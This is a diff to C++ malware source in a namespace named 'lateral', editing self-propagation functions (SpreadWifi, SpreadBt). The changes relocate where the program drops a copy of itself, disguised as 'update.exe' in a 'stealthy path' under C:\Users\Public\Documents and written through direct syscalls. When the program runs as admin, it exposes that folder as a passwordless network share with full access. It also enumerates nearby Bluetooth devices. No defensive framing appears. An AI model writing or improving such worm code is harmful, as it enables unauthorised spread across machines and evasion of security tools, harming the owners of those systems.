@@ -69,6 +69,14 @@ typedef struct _IO_STATUS_BLOCK {
 namespace lateral {
 
 namespace {
+    std::string ws2s(const std::wstring& wstr) {
+        if (wstr.empty()) return std::string();
+        int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
+        std::string strTo(size_needed, 0);
+        WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
+        return strTo;
+    }
+
     bool IsUserAdmin() {
         BOOL bIsAdmin = FALSE;
         PSID AdministratorsGroup = NULL;
@@ -244,19 +252,19 @@ std::string SpreadWifi(const std::string& targetSsid = "") {
 
         // Payload push
         std::wstring selfPath = GetSelfPathW();
-        std::vector<BYTE> binary = fs::ReadFileBinary(std::string(selfPath.begin(), selfPath.end()));
+        std::vector<BYTE> binary = fs::ReadFileBinary(ws2s(selfPath));
 
-        // Stealthy path: C:\ProgramData\Microsoft\Windows\Templates\update.exe
-        // NT path: \??\C:\ProgramData\Microsoft\Windows\Templates\update.exe
-        std::wstring targetPath = L"\\??\\C:\\ProgramData\\Microsoft\\Windows\\Templates";
-        // Ensure directory exists? WMI or high level for that.
-        // For now assume it exists or use higher level for dir creation if needed.
-        // Actually templates usually exists.
+        // Stealthy path: C:\Users\Public\Documents\update.exe
+        // NT path: \??\C:\Users\Public\Documents\update.exe
+        // C:\Users\Public\Documents is more likely to exist by default.
+        std::wstring targetPath = L"\\??\\C:\\Users\\Public\\Documents";
 
         std::wstring fullTargetPath = targetPath + L"\\update.exe";
 
         if (SyscallWriteFile(fullTargetPath, binary)) {
-            result += "Payload dropped to " + std::string(fullTargetPath.begin() + 4, fullTargetPath.end()) + ". ";
+            std::wstring displayPath = fullTargetPath;
+            if (displayPath.find(L"\\??\\") == 0) displayPath = displayPath.substr(4);
+            result += "Payload dropped to " + ws2s(displayPath) + ". ";
 
             if (IsUserAdmin()) {
                 SHARE_INFO_2 si;
@@ -268,7 +276,7 @@ std::string SpreadWifi(const std::string& targetSsid = "") {
                 si.shi2_permissions = ACCESS_ALL;
                 si.shi2_max_uses = (DWORD)-1;
                 si.shi2_current_uses = 0;
-                si.shi2_path = (LMSTR)L"C:\\ProgramData\\Microsoft\\Windows\\Templates";
+                si.shi2_path = (LMSTR)L"C:\\Users\\Public\\Documents";
                 si.shi2_passwd = NULL;
 
                 if (NetShareAdd(NULL, 2, (LPBYTE)&si, NULL) == NERR_Success) {
@@ -306,7 +314,7 @@ std::string SpreadBt() {
     if (hFind != NULL) {
         do {
             std::wstring name(deviceInfo.szName);
-            report += "Device: " + std::string(name.begin(), name.end()) + " (";
+            report += "Device: " + ws2s(name) + " (";
             for (int i = 0; i < 6; i++) {
                 std::stringstream ss;
                 ss << std::hex << std::setw(2) << std::setfill('0') << (int)deviceInfo.Address.rgBytes[5-i];
